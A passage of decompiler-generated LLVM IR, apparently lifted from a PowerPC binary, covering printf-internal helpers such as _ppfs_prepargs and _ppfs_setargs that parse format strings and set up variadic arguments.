  %v1_1000d2f8 = add i32 %v0_1000d2f8, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1000d300 = load i32, i32* @r31, align 4
  %v2_1000d300 = add i32 %v1_1000d300, 24
  %v3_1000d300 = inttoptr i32 %v2_1000d300 to i32*
  store i32 %v1_1000d2f8, i32* %v3_1000d300, align 4
  %v0_1000d304 = load i32, i32* @r31, align 4
  %v1_1000d304 = add i32 %v0_1000d304, 40
  store i32 %v1_1000d304, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d308

dec_label_pc_1000d308:                            ; preds = %dec_label_pc_1000d308, %entry
  %v1_1000d308 = phi i32 [ %v1_1000d30c, %dec_label_pc_1000d308 ], [ %v1_1000d304, %entry ]
  %v0_1000d308 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d308 = inttoptr i32 %v1_1000d308 to i32*
  store i32 %v0_1000d308, i32* %v2_1000d308, align 4
  %v0_1000d30c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d30c = add i32 %v0_1000d30c, 4
  store i32 %v1_1000d30c, i32* %r9.global-to-local, align 4
  %v0_1000d310 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d310 = add i32 %v0_1000d310, -1
  store i32 %v1_1000d310, i32* %ctr.global-to-local, align 4
  %v2_1000d310 = icmp eq i32 %v1_1000d310, 0
  br i1 %v2_1000d310, label %dec_label_pc_1000d314, label %dec_label_pc_1000d308

dec_label_pc_1000d314:                            ; preds = %dec_label_pc_1000d308
  %v0_1000d314 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d354

dec_label_pc_1000d324:                            ; preds = %dec_label_pc_1000d354
  %v3_1000d35c = icmp eq i8 %v2_1000d354, 37
  br i1 %v3_1000d35c, label %dec_label_pc_1000d328, label %dec_label_pc_1000d350

dec_label_pc_1000d328:                            ; preds = %dec_label_pc_1000d324
  %v1_1000d328 = add i32 %v0_1000d328, 1
  %v2_1000d328 = inttoptr i32 %v1_1000d328 to i8*
  %v3_1000d328 = load i8, i8* %v2_1000d328, align 1
  %v4_1000d328 = zext i8 %v3_1000d328 to i32
  store i32 %v4_1000d328, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d328, i32* %r9.global-to-local, align 4
  %v3_1000d330 = icmp eq i8 %v3_1000d328, 37
  br i1 %v3_1000d330, label %dec_label_pc_1000d350, label %dec_label_pc_1000d338

dec_label_pc_1000d338:                            ; preds = %dec_label_pc_1000d328
  %v0_1000d32c = load i32, i32* @r31, align 4
  %v2_1000d338 = inttoptr i32 %v0_1000d32c to i32*
  store i32 %v1_1000d328, i32* %v2_1000d338, align 4
  store i32 268489536, i32* @lr, align 4
  %v1_1000d33c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000d33c = call i32 @_ppfs_parsespec(i32* %v2_1000d338, i32 %v1_1000d33c)
  %v1_1000d340 = icmp slt i32 %v3_1000d33c, 0
  br i1 %v1_1000d340, label %dec_label_pc_1000d36c, label %dec_label_pc_1000d348

dec_label_pc_1000d348:                            ; preds = %dec_label_pc_1000d338
  %v0_1000d348 = load i32, i32* @r31, align 4
  %v1_1000d348 = inttoptr i32 %v0_1000d348 to i32*
  %v2_1000d348 = load i32, i32* %v1_1000d348, align 4
  br label %dec_label_pc_1000d354

dec_label_pc_1000d350:                            ; preds = %dec_label_pc_1000d324, %dec_label_pc_1000d328
  %v0_1000d350 = phi i32 [ %v0_1000d328, %dec_label_pc_1000d324 ], [ %v1_1000d328, %dec_label_pc_1000d328 ]
  %v1_1000d350 = add i32 %v0_1000d350, 1
  br label %dec_label_pc_1000d354

dec_label_pc_1000d354:                            ; preds = %dec_label_pc_1000d348, %dec_label_pc_1000d350, %dec_label_pc_1000d314
  %v0_1000d328 = phi i32 [ %v0_1000d314, %dec_label_pc_1000d314 ], [ %v1_1000d350, %dec_label_pc_1000d350 ], [ %v2_1000d348, %dec_label_pc_1000d348 ]
  store i32 %v0_1000d328, i32* %r9.global-to-local, align 4
  %v1_1000d354 = inttoptr i32 %v0_1000d328 to i8*
  %v2_1000d354 = load i8, i8* %v1_1000d354, align 1
  %v3_1000d354 = zext i8 %v2_1000d354 to i32
  store i32 %v3_1000d354, i32* %r0.global-to-local, align 4
  %v3_1000d358 = icmp eq i8 %v2_1000d354, 0
  br i1 %v3_1000d358, label %dec_label_pc_1000d364, label %dec_label_pc_1000d324

dec_label_pc_1000d364:                            ; preds = %dec_label_pc_1000d354
  %v0_1000d364 = load i32, i32* @r30, align 4
  %v1_1000d364 = load i32, i32* @r31, align 4
  %v2_1000d364 = inttoptr i32 %v1_1000d364 to i32*
  store i32 %v0_1000d364, i32* %v2_1000d364, align 4
  br label %dec_label_pc_1000d36c

dec_label_pc_1000d36c:                            ; preds = %dec_label_pc_1000d338, %dec_label_pc_1000d364
  %storemerge = phi i32 [ 0, %dec_label_pc_1000d364 ], [ -1, %dec_label_pc_1000d338 ]
  store i32 %v0_1000d2c8, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1000d354, { 1, 2, 0 }
  uselistorder i32 %v0_1000d328, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000d310, { 1, 0 }
  uselistorder i32 %v1_1000d30c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000d36c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d354, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d350, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000d380 = load i32, i32* @lr, align 4
  %v0_1000d388 = load i32, i32* @r3, align 4
  store i32 %v0_1000d388, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000d3a4 = add i32 %v0_1000d388, 24
  %v2_1000d3a4 = inttoptr i32 %v1_1000d3a4 to i32*
  %v3_1000d3a4 = load i32, i32* %v2_1000d3a4, align 4
  store i32 %v3_1000d3a4, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1000d3a4, 1
  br i1 %tmp4, label %dec_label_pc_1000d3c8, label %dec_label_pc_1000d3b0

dec_label_pc_1000d3b0:                            ; preds = %entry
  %v2_1000d3b0 = add i32 %v0_1000d388, 8
  %v3_1000d3b0 = inttoptr i32 %v2_1000d3b0 to i32*
  store i32 0, i32* %v3_1000d3b0, align 4
  %v0_1000d3b4 = load i32, i32* @r30, align 4
  %v1_1000d3b4 = load i32, i32* @r3, align 4
  %v2_1000d3b4 = add i32 %v1_1000d3b4, 28
  %v3_1000d3b4 = inttoptr i32 %v2_1000d3b4 to i32*
  store i32 %v0_1000d3b4, i32* %v3_1000d3b4, align 4
  %v0_1000d3b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d3b8 = load i32, i32* @r3, align 4
  %v2_1000d3b8 = add i32 %v1_1000d3b8, 24
  %v3_1000d3b8 = inttoptr i32 %v2_1000d3b8 to i32*
  store i32 %v0_1000d3b8, i32* %v3_1000d3b8, align 4
  %v0_1000d3bc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d3bc = load i32, i32* @r3, align 4
  %v2_1000d3bc = add i32 %v1_1000d3bc, 4
  %v3_1000d3bc = inttoptr i32 %v2_1000d3bc to i32*
  store i32 %v0_1000d3bc, i32* %v3_1000d3bc, align 4
  store i32 268489668, i32* @lr, align 4
  %v0_1000d3c0 = call i32 @_ppfs_setargs()
  store i32 %v0_1000d3c0, i32* %r3.global-to-local, align 4
  %v0_1000d3c4 = load i32, i32* @r30, align 4
  %v1_1000d3c4 = load i32, i32* @r31, align 4
  %v2_1000d3c4 = add i32 %v1_1000d3c4, 24
  %v3_1000d3c4 = inttoptr i32 %v2_1000d3c4 to i32*
  store i32 %v0_1000d3c4, i32* %v3_1000d3c4, align 4
  %v0_1000d3d8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d3c8

dec_label_pc_1000d3c8:                            ; preds = %entry, %dec_label_pc_1000d3b0
  %v0_1000d3d8 = phi i32 [ %v0_1000d388, %entry ], [ %v0_1000d3d8.pre, %dec_label_pc_1000d3b0 ]
  store i32 %v0_1000d380, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d3d8

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3c8, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000d3dc = load i32, i32* @r3, align 4
  %v1_1000d3dc = add i32 %v0_1000d3dc, 24
  %v2_1000d3dc = inttoptr i32 %v1_1000d3dc to i32*
  %v3_1000d3dc = load i32, i32* %v2_1000d3dc, align 4
  store i32 %v3_1000d3dc, i32* %r0.global-to-local, align 4
  %v1_1000d3e0 = add i32 %v0_1000d3dc, 88
  store i32 %v1_1000d3e0, i32* @r8, align 4
  %v1_1000d3e4 = add i32 %v0_1000d3dc, 8
  %v2_1000d3e4 = inttoptr i32 %v1_1000d3e4 to i32*
  %v3_1000d3e4 = load i32, i32* %v2_1000d3e4, align 4
  store i32 %v3_1000d3e4, i32* %r9.global-to-local, align 4
  %v2_1000d3e8 = icmp sgt i32 %v3_1000d3dc, 0
  %v3_1000d3e8 = icmp eq i32 %v3_1000d3dc, 0
  store i1 %v2_1000d3e8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d3e8, label %dec_label_pc_1000d3f0, label %dec_label_pc_1000d5dc

dec_label_pc_1000d3f0:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1000d3f4 = icmp ne i32 %v3_1000d3e4, -2147483648
  %v4_1000d3f4 = icmp eq i32 %v3_1000d3e4, -2147483648
  store i1 %v3_1000d3f4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d3f4, label %dec_label_pc_1000d3fc, label %dec_label_pc_1000d43c

dec_label_pc_1000d3fc:                            ; preds = %dec_label_pc_1000d3f0
  %v1_1000d3fc = add i32 %v0_1000d3dc, 76
  %v2_1000d3fc = inttoptr i32 %v1_1000d3fc to i8*
  %v3_1000d3fc = load i8, i8* %v2_1000d3fc, align 1
  %v4_1000d3fc = zext i8 %v3_1000d3fc to i32
  store i32 %v4_1000d3fc, i32* %r10.global-to-local, align 4
  store i32 %v1_1000d3fc, i32* %r11.global-to-local, align 4
  %v2_1000d404 = icmp ugt i8 %v3_1000d3fc, 8
  store i1 %v2_1000d404, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1000d3fc, 7
  br i1 %tmp, label %dec_label_pc_1000d424, label %dec_label_pc_1000d40c

dec_label_pc_1000d40c:                            ; preds = %dec_label_pc_1000d3fc
  %v1_1000d40c = add i32 %v0_1000d3dc, 84
  %v2_1000d40c = inttoptr i32 %v1_1000d40c to i32*
  %v3_1000d40c = load i32, i32* %v2_1000d40c, align 4
  %v1_1000d410 = mul nuw nsw i32 %v4_1000d3fc, 4
  %v2_1000d414 = add i32 %v3_1000d40c, %v1_1000d410
  store i32 %v2_1000d414, i32* %r9.global-to-local, align 4
  %v1_1000d418 = add nuw nsw i32 %v4_1000d3fc, 1
  store i32 %v1_1000d418, i32* %r0.global-to-local, align 4
  %v1_1000d41c = trunc i32 %v1_1000d418 to i8
  store i8 %v1_1000d41c, i8* %v2_1000d3fc, align 1
  br label %dec_label_pc_1000d430

dec_label_pc_1000d424:                            ; preds = %dec_label_pc_1000d3fc
  %v1_1000d424 = add i32 %v0_1000d3dc, 80
  %v2_1000d424 = inttoptr i32 %v1_1000d424 to i32*
  %v3_1000d424 = load i32, i32* %v2_1000d424, align 4
  store i32 %v3_1000d424, i32* %r9.global-to-local, align 4
  %v1_1000d428 = add i32 %v3_1000d424, 4
  store i32 %v1_1000d428, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d428, i32* %v2_1000d424, align 4
  br label %dec_label_pc_1000d430

dec_label_pc_1000d430:                            ; preds = %dec_label_pc_1000d40c, %dec_label_pc_1000d424
  %v0_1000d430 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d430 = inttoptr i32 %v0_1000d430 to i32*
  %v2_1000d430 = load i32, i32* %v1_1000d430, align 4
  store i32 %v2_1000d430, i32* %r0.global-to-local, align 4
  %v1_1000d434 = load i32, i32* @r8, align 4
  %v2_1000d434 = inttoptr i32 %v1_1000d434 to i32*
  store i32 %v2_1000d430, i32* %v2_1000d434, align 4
  %v0_1000d438 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d438 = load i32, i32* @r3, align 4
  %v2_1000d438 = add i32 %v1_1000d438, 8
  %v3_1000d438 = inttoptr i32 %v2_1000d438 to i32*
  store i32 %v0_1000d438, i32* %v3_1000d438, align 4
  %v0_1000d43c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d43c

dec_label_pc_1000d43c:                            ; preds = %dec_label_pc_1000d3f0, %dec_label_pc_1000d430
  %v2_1000d46c = phi i32 [ %v0_1000d3dc, %dec_label_pc_1000d3f0 ], [ %v0_1000d43c.pre, %dec_label_pc_1000d430 ]
  %v1_1000d43c = add i32 %v2_1000d46c, 4
  %v2_1000d43c = inttoptr i32 %v1_1000d43c to i32*
  %v3_1000d43c = load i32, i32* %v2_1000d43c, align 4
  store i32 %v3_1000d43c, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1000d444 = icmp ne i32 %v3_1000d43c, -2147483648
  %v4_1000d444 = icmp eq i32 %v3_1000d43c, -2147483648
  store i1 %v3_1000d444, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d444, label %dec_label_pc_1000d44c, label %dec_label_pc_1000d5cc.preheader

dec_label_pc_1000d44c:                            ; preds = %dec_label_pc_1000d43c
  %v1_1000d44c = add i32 %v2_1000d46c, 76
  %v2_1000d44c = inttoptr i32 %v1_1000d44c to i8*
  %v3_1000d44c = load i8, i8* %v2_1000d44c, align 1
  %v4_1000d44c = zext i8 %v3_1000d44c to i32
  store i32 %v4_1000d44c, i32* %r10.global-to-local, align 4
  store i32 %v1_1000d44c, i32* %r11.global-to-local, align 4
  %v2_1000d454 = icmp ugt i8 %v3_1000d44c, 8
  store i1 %v2_1000d454, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1000d44c, 7
  br i1 %tmp22, label %dec_label_pc_1000d474, label %dec_label_pc_1000d45c

dec_label_pc_1000d45c:                            ; preds = %dec_label_pc_1000d44c
  %v1_1000d45c = add i32 %v2_1000d46c, 84
  %v2_1000d45c = inttoptr i32 %v1_1000d45c to i32*
  %v3_1000d45c = load i32, i32* %v2_1000d45c, align 4
  %v1_1000d460 = mul nuw nsw i32 %v4_1000d44c, 4
  %v2_1000d464 = add i32 %v3_1000d45c, %v1_1000d460
  store i32 %v2_1000d464, i32* %r9.global-to-local, align 4
  %v1_1000d468 = add nuw nsw i32 %v4_1000d44c, 1
  store i32 %v1_1000d468, i32* %r0.global-to-local, align 4
  %v1_1000d46c = trunc i32 %v1_1000d468 to i8
  store i8 %v1_1000d46c, i8* %v2_1000d44c, align 1
  br label %dec_label_pc_1000d480

dec_label_pc_1000d474:                            ; preds = %dec_label_pc_1000d44c
  %v1_1000d474 = add i32 %v2_1000d46c, 80
  %v2_1000d474 = inttoptr i32 %v1_1000d474 to i32*
  %v3_1000d474 = load i32, i32* %v2_1000d474, align 4
  store i32 %v3_1000d474, i32* %r9.global-to-local, align 4
  %v1_1000d478 = add i32 %v3_1000d474, 4
  store i32 %v1_1000d478, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d478, i32* %v2_1000d474, align 4
  br label %dec_label_pc_1000d480

dec_label_pc_1000d480:                            ; preds = %dec_label_pc_1000d45c, %dec_label_pc_1000d474
  %v0_1000d480 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d480 = inttoptr i32 %v0_1000d480 to i32*
  %v2_1000d480 = load i32, i32* %v1_1000d480, align 4
  store i32 %v2_1000d480, i32* %r0.global-to-local, align 4
  %v1_1000d484 = load i32, i32* @r8, align 4
  %v2_1000d484 = inttoptr i32 %v1_1000d484 to i32*
  store i32 %v2_1000d480, i32* %v2_1000d484, align 4
  %v0_1000d488 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d488 = load i32, i32* @r3, align 4
  %v2_1000d488 = add i32 %v1_1000d488, 4
  %v3_1000d488 = inttoptr i32 %v2_1000d488 to i32*
  store i32 %v0_1000d488, i32* %v3_1000d488, align 4
  %v0_1000d5cc5.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d5cc.preheader

dec_label_pc_1000d5cc.preheader:                  ; preds = %dec_label_pc_1000d43c, %dec_label_pc_1000d480
  %v0_1000d5cc5 = phi i32 [ %v2_1000d46c, %dec_label_pc_1000d43c ], [ %v0_1000d5cc5.pre, %dec_label_pc_1000d480 ]
  store i32 0, i32* @r7, align 4
  %v1_1000d5cc6 = add i32 %v0_1000d5cc5, 28
  %v2_1000d5cc7 = inttoptr i32 %v1_1000d5cc6 to i32*
  %v3_1000d5cc8 = load i32, i32* %v2_1000d5cc7, align 4
  store i32 %v3_1000d5cc8, i32* %r0.global-to-local, align 4
  %v2_1000d5d09 = icmp sgt i32 %v3_1000d5cc8, 0
  %v3_1000d5d010 = icmp slt i32 %v3_1000d5cc8, 0
  store i1 %v3_1000d5d010, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000d5d09, label %dec_label_pc_1000d494, label %dec_label_pc_1000d61c

dec_label_pc_1000d494:                            ; preds = %dec_label_pc_1000d5cc.preheader, %dec_label_pc_1000d5c8
  %v2_1000d5a8 = phi i32 [ %v0_1000d5cc, %dec_label_pc_1000d5c8 ], [ %v0_1000d5cc5, %dec_label_pc_1000d5cc.preheader ]
  %v0_1000d494 = phi i32 [ %v1_1000d5c8, %dec_label_pc_1000d5c8 ], [ 0, %dec_label_pc_1000d5cc.preheader ]
  %v1_1000d494 = mul i32 %v0_1000d494, 4
  %v2_1000d498 = add i32 %v1_1000d494, %v2_1000d5a8
  store i32 %v2_1000d498, i32* %r9.global-to-local, align 4
  %v1_1000d49c = add i32 %v2_1000d498, 40
  %v2_1000d49c = inttoptr i32 %v1_1000d49c to i32*
  %v3_1000d49c = load i32, i32* %v2_1000d49c, align 4
  store i32 %v3_1000d49c, i32* %r0.global-to-local, align 4
  %v2_1000d4a0 = icmp sgt i32 %v3_1000d49c, 8
  %v3_1000d4a0 = icmp eq i32 %v3_1000d49c, 8
  store i1 %v2_1000d4a0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d4a0, label %dec_label_pc_1000d5c8, label %dec_label_pc_1000d4a8

dec_label_pc_1000d4a8:                            ; preds = %dec_label_pc_1000d494
  %v1_1000d4a8 = add i32 %v2_1000d5a8, 76
  store i32 %v1_1000d4a8, i32* %r10.global-to-local, align 4
  br i1 %v2_1000d4a0, label %dec_label_pc_1000d4c4, label %dec_label_pc_1000d4b0

dec_label_pc_1000d4b0:                            ; preds = %dec_label_pc_1000d4a8
  %v2_1000d4b0 = icmp sgt i32 %v3_1000d49c, 2
  store i1 %v2_1000d4b0, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_1000d49c, 3
  br i1 %tmp23, label %dec_label_pc_1000d58c, label %dec_label_pc_1000d4dc

dec_label_pc_1000d4c4:                            ; preds = %dec_label_pc_1000d4a8
  %v2_1000d4c4 = icmp sgt i32 %v3_1000d49c, 1024
  store i1 %v2_1000d4c4, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_1000d49c, 1025
  br i1 %tmp24, label %dec_label_pc_1000d58c, label %dec_label_pc_1000d4d0

dec_label_pc_1000d4d0:                            ; preds = %dec_label_pc_1000d4c4
  %v2_1000d4d0 = icmp sgt i32 %v3_1000d49c, 2048
  %v3_1000d4d0 = icmp eq i32 %v3_1000d49c, 2048
  store i1 %v2_1000d4d0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d4d0, label %dec_label_pc_1000d4e4, label %dec_label_pc_1000d4d8

dec_label_pc_1000d4d8:                            ; preds = %dec_label_pc_1000d4d0
  %v2_1000d4d8 = icmp sgt i32 %v3_1000d49c, 2055
  %v3_1000d4d8 = icmp eq i32 %v3_1000d49c, 2055
  store i1 %v2_1000d4d8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d4d8, label %dec_label_pc_1000d540, label %dec_label_pc_1000d58c

dec_label_pc_1000d4dc:                            ; preds = %dec_label_pc_1000d4b0
  %v3_1000d4bc = icmp eq i32 %v3_1000d49c, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d4bc, label %dec_label_pc_1000d540, label %dec_label_pc_1000d58c

dec_label_pc_1000d4e4:                            ; preds = %dec_label_pc_1000d4d0
  %v2_1000d4e4 = inttoptr i32 %v1_1000d4a8 to i8*
  %v3_1000d4e4 = load i8, i8* %v2_1000d4e4, align 1
  %v4_1000d4e4 = zext i8 %v3_1000d4e4 to i32
  %v2_1000d4e8 = icmp ugt i8 %v3_1000d4e4, 6
  store i1 %v2_1000d4e8, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_1000d4e4, 2
  %v1_1000d4ec = zext i8 %tmp28 to i32
  store i32 %v1_1000d4ec, i32* %r9.global-to-local, align 4
  %v2_1000d4f0 = add nuw nsw i32 %v1_1000d4ec, %v4_1000d4e4
  store i32 %v2_1000d4f0, i32* %r0.global-to-local, align 4
  %v1_1000d4f4 = trunc i32 %v2_1000d4f0 to i8
  store i8 %v1_1000d4f4, i8* %v2_1000d4e4, align 1
  %v0_1000d4f8 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_1000d4f8, label %dec_label_pc_1000d518, label %dec_label_pc_1000d4fc

dec_label_pc_1000d4fc:                            ; preds = %dec_label_pc_1000d4e4
  %v0_1000d4fc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d4fc = urem i32 %v0_1000d4fc, 256
  store i32 %v1_1000d4fc, i32* %r9.global-to-local, align 4
  %v0_1000d500 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d500 = add i32 %v0_1000d500, 8
  %v2_1000d500 = inttoptr i32 %v1_1000d500 to i32*
  %v3_1000d500 = load i32, i32* %v2_1000d500, align 4
  %v1_1000d504 = mul nuw nsw i32 %v1_1000d4fc, 4
  store i32 %v1_1000d504, i32* %r0.global-to-local, align 4
  %v1_1000d508 = add nuw nsw i32 %v1_1000d4fc, 2
  store i32 %v1_1000d508, i32* %r9.global-to-local, align 4
  %v2_1000d50c = add i32 %v3_1000d500, %v1_1000d504
  store i32 %v2_1000d50c, i32* %r11.global-to-local, align 4
  %v1_1000d510 = trunc i32 %v1_1000d508 to i8
  %v2_1000d510 = load i32, i32* @r3, align 4
  %v3_1000d510 = add i32 %v2_1000d510, 76
  %v4_1000d510 = inttoptr i32 %v3_1000d510 to i8*
  store i8 %v1_1000d510, i8* %v4_1000d510, align 1
  br label %dec_label_pc_1000d52c

dec_label_pc_1000d518:                            ; preds = %dec_label_pc_1000d4e4
  %v0_1000d518 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d518 = add i32 %v0_1000d518, 4
  %v2_1000d518 = inttoptr i32 %v1_1000d518 to i32*
  %v3_1000d518 = load i32, i32* %v2_1000d518, align 4
  %v1_1000d51c = add i32 %v3_1000d518, 7
  store i32 %v1_1000d51c, i32* %r9.global-to-local, align 4
  %v1_1000d520 = call i32 @__asm_rlwinm(i32 %v1_1000d51c, i32 0, i32 0, i32 28)
  store i32 %v1_1000d520, i32* %r11.global-to-local, align 4
  %v1_1000d524 = add i32 %v1_1000d520, 8
  store i32 %v1_1000d524, i32* %r0.global-to-local, align 4
  %v1_1000d528 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d528 = add i32 %v1_1000d528, 4
  %v3_1000d528 = inttoptr i32 %v2_1000d528 to i32*
  store i32 %v1_1000d524, i32* %v3_1000d528, align 4
  br label %dec_label_pc_1000d52c

dec_label_pc_1000d52c:                            ; preds = %dec_label_pc_1000d4fc, %dec_label_pc_1000d518
  %v0_1000d52c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d52c = inttoptr i32 %v0_1000d52c to i32*
  %v2_1000d52c = load i32, i32* %v1_1000d52c, align 4
  store i32 %v2_1000d52c, i32* %r9.global-to-local, align 4
  %v1_1000d530 = add i32 %v0_1000d52c, 4
  %v2_1000d530 = inttoptr i32 %v1_1000d530 to i32*
  %v3_1000d530 = load i32, i32* %v2_1000d530, align 4
  store i32 %v3_1000d530, i32* %r10.global-to-local, align 4
  %v1_1000d534 = load i32, i32* @r8, align 4
  %v2_1000d534 = inttoptr i32 %v1_1000d534 to i32*
  store i32 %v2_1000d52c, i32* %v2_1000d534, align 4
  %v0_1000d538 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d538 = load i32, i32* @r8, align 4
  %v2_1000d538 = add i32 %v1_1000d538, 4
  %v3_1000d538 = inttoptr i32 %v2_1000d538 to i32*
  store i32 %v0_1000d538, i32* %v3_1000d538, align 4
  br label %dec_label_pc_1000d5c4

dec_label_pc_1000d540:                            ; preds = %dec_label_pc_1000d4d8, %dec_label_pc_1000d4dc
  store i32 %v1_1000d4a8, i32* %r10.global-to-local, align 4
  %v1_1000d544 = add i32 %v2_1000d5a8, 77
  %v2_1000d544 = inttoptr i32 %v1_1000d544 to i8*
  %v3_1000d544 = load i8, i8* %v2_1000d544, align 1
  %v4_1000d544 = zext i8 %v3_1000d544 to i32
  store i32 %v4_1000d544, i32* %r11.global-to-local, align 4
  %v2_1000d548 = icmp ugt i8 %v3_1000d544, 8
  store i1 %v2_1000d548, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_1000d544, 7
  br i1 %tmp25, label %dec_label_pc_1000d56c, label %dec_label_pc_1000d550

dec_label_pc_1000d550:                            ; preds = %dec_label_pc_1000d540
  %v1_1000d550 = add i32 %v2_1000d5a8, 84
  %v2_1000d550 = inttoptr i32 %v1_1000d550 to i32*
  %v3_1000d550 = load i32, i32* %v2_1000d550, align 4
  %v1_1000d554 = mul nuw nsw i32 %v4_1000d544, 8
  %v1_1000d558 = add nuw nsw i32 %v1_1000d554, 32
  %v2_1000d55c = add i32 %v1_1000d558, %v3_1000d550
  store i32 %v2_1000d55c, i32* %r9.global-to-local, align 4
  %v1_1000d560 = add nuw nsw i32 %v4_1000d544, 1
  store i32 %v1_1000d560, i32* %r0.global-to-local, align 4
  %v1_1000d564 = trunc i32 %v1_1000d560 to i8
  store i8 %v1_1000d564, i8* %v2_1000d544, align 1
  br label %dec_label_pc_1000d5c4

dec_label_pc_1000d56c:                            ; preds = %dec_label_pc_1000d540
  %v1_1000d56c = add i32 %v2_1000d5a8, 80
  %v2_1000d56c = inttoptr i32 %v1_1000d56c to i32*
  %v3_1000d56c = load i32, i32* %v2_1000d56c, align 4
  %v1_1000d570 = add i32 %v3_1000d56c, 7
  store i32 %v1_1000d570, i32* %r9.global-to-local, align 4
  %v1_1000d574 = call i32 @__asm_rlwinm(i32 %v1_1000d570, i32 0, i32 0, i32 28)
  store i32 %v1_1000d574, i32* %r9.global-to-local, align 4
  %v1_1000d578 = add i32 %v1_1000d574, 8
  store i32 %v1_1000d578, i32* %r0.global-to-local, align 4
  %v1_1000d57c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d57c = add i32 %v1_1000d57c, 4
  %v3_1000d57c = inttoptr i32 %v2_1000d57c to i32*
  store i32 %v1_1000d578, i32* %v3_1000d57c, align 4
  br label %dec_label_pc_1000d5c4

dec_label_pc_1000d58c:                            ; preds = %dec_label_pc_1000d4d8, %dec_label_pc_1000d4dc, %dec_label_pc_1000d4c4, %dec_label_pc_1000d4b0
  %v2_1000d58c = inttoptr i32 %v1_1000d4a8 to i8*
  %v3_1000d58c = load i8, i8* %v2_1000d58c, align 1
  %v4_1000d58c = zext i8 %v3_1000d58c to i32
  store i32 %v4_1000d58c, i32* %r11.global-to-local, align 4
  %v2_1000d590 = icmp ugt i8 %v3_1000d58c, 8
  store i1 %v2_1000d590, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1000d58c, 7
  br i1 %tmp26, label %dec_label_pc_1000d5b0, label %dec_label_pc_1000d598

dec_label_pc_1000d598:                            ; preds = %dec_label_pc_1000d58c
  %v1_1000d598 = add i32 %v2_1000d5a8, 84
  %v2_1000d598 = inttoptr i32 %v1_1000d598 to i32*
  %v3_1000d598 = load i32, i32* %v2_1000d598, align 4
  %v1_1000d59c = mul nuw nsw i32 %v4_1000d58c, 4
  %v2_1000d5a0 = add i32 %v3_1000d598, %v1_1000d59c
  store i32 %v2_1000d5a0, i32* %r9.global-to-local, align 4
  %v1_1000d5a4 = add nuw nsw i32 %v4_1000d58c, 1
  store i32 %v1_1000d5a4, i32* %r0.global-to-local, align 4
  %v1_1000d5a8 = trunc i32 %v1_1000d5a4 to i8
  store i8 %v1_1000d5a8, i8* %v2_1000d58c, align 1
  br label %dec_label_pc_1000d5bc

dec_label_pc_1000d5b0:                            ; preds = %dec_label_pc_1000d58c
  %v1_1000d5b0 = add i32 %v2_1000d5a8, 80
  %v2_1000d5b0 = inttoptr i32 %v1_1000d5b0 to i32*
